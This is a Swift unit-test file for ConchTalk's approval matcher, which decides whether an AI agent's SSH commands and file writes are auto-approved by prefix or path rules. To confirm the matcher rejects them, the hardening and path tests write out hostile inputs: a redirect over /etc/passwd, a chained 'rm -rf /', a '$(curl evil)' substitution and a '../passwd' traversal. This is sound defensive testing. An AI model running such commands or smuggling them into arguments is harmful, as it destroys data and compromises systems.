/// 文件说明：ApprovalMatchingTests，验证规则匹配的安全不变量（hardening 否决、前缀、路径作用域）。
import Testing
@testable import ConchTalk

@Suite("ApprovalMatching")
struct ApprovalMatchingTests {
    private let gitRule = ApprovalMatcher.commandPrefix(tokens: ["git", "-C", "/srv/app", "pull"])

    @Test("命令前缀命中 + 尾部多余参数仍命中")
    func commandPrefixMatch() {
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /srv/app pull"]) == true)
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /srv/app pull --rebase"]) == true)
    }

    @Test("动词/路径不同不命中")
    func commandPrefixMismatch() {
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /other pull"]) == false)
        #expect(ApprovalMatching.matches(matcher: .commandPrefix(tokens: ["systemctl", "status"]),
            toolName: "execute_ssh_command", arguments: ["command": "systemctl stop nginx"]) == false)
    }

    @Test("关键安全：含重定向/注入的命令绝不被前缀放行")
    func hardeningVeto() {
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /srv/app pull > /etc/passwd"]) == false)
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /srv/app pull && rm -rf /"]) == false) // 多段
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "execute_ssh_command",
            arguments: ["command": "git -C /srv/app pull $(curl evil)"]) == false)
    }

    @Test("工具名不匹配则不命中")
    func toolMismatch() {
        #expect(ApprovalMatching.matches(matcher: gitRule, toolName: "write_file",
            arguments: ["command": "git -C /srv/app pull"]) == false)
    }

    @Test("路径精确 / 递归 / 拒 ..")
    func pathScope() {
        let exact = ApprovalMatcher.pathPrefix(prefix: "/etc/nginx/nginx.conf", recursive: false)
        #expect(ApprovalMatching.matches(matcher: exact, toolName: "write_file",
            arguments: ["path": "/etc/nginx/nginx.conf"]) == true)
        #expect(ApprovalMatching.matches(matcher: exact, toolName: "write_file",
            arguments: ["path": "/etc/nginx/other.conf"]) == false)

        let dir = ApprovalMatcher.pathPrefix(prefix: "/etc/nginx", recursive: true)
        #expect(ApprovalMatching.matches(matcher: dir, toolName: "edit_file",
            arguments: ["path": "/etc/nginx/sites/app.conf"]) == true)
        #expect(ApprovalMatching.matches(matcher: dir, toolName: "write_file",
            arguments: ["path": "/etc/nginxx/x"]) == false) // 前缀边界
        #expect(ApprovalMatching.matches(matcher: dir, toolName: "write_file",
            arguments: ["path": "/etc/nginx/../passwd"]) == false) // .. 拒绝
    }

    @Test("最窄建议规则：命令=完整 argv，路径=精确文件，多段=nil")
    func suggested() {
        if case .commandPrefix(let t)? = ApprovalMatching.suggestedMatcher(
            toolName: "execute_ssh_command", arguments: ["command": "systemctl status nginx"]) {
            #expect(t == ["systemctl", "status", "nginx"])
        } else { Issue.record("应为 commandPrefix") }

        if case .pathPrefix(let p, let r)? = ApprovalMatching.suggestedMatcher(
            toolName: "write_file", arguments: ["path": "/srv/a.conf"]) {
            #expect(p == "/srv/a.conf"); #expect(r == false)
        } else { Issue.record("应为 pathPrefix") }

        #expect(ApprovalMatching.suggestedMatcher(toolName: "execute_ssh_command",
            arguments: ["command": "a && b"]) == nil)
        #expect(ApprovalMatching.suggestedMatcher(toolName: "execute_ssh_command",
            arguments: ["command": "echo x > /tmp/y"]) == nil) // hardening → 不可记忆
    }
}
